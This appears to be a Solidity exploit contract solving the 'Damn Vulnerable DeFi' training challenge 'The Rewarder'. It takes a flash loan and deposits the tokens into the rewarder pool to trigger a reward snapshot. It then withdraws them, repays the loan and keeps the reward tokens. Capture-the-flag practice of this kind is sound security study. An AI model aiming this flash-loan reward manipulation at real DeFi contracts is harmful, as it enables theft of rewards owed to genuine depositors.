// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "forge-std/console.sol";

contract TrojanHorse {


    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;
    RewardToken rewardToken;
    DamnValuableToken liquidityToken;

    constructor (address _flashLoanerPool, address _theRewarderPool, address _rewardToken, address _liquidityToken) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function attack(uint256 amount) public {

        flashLoanerPool.flashLoan(amount);
        console.log("%d", rewardToken.balanceOf(address(this)));
        console.log("%s", "finished flash loan in attack");
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));

    }

    function receiveFlashLoan(uint256 amount) public {

        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);

        theRewarderPool.distributeRewards();

        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);

    }

}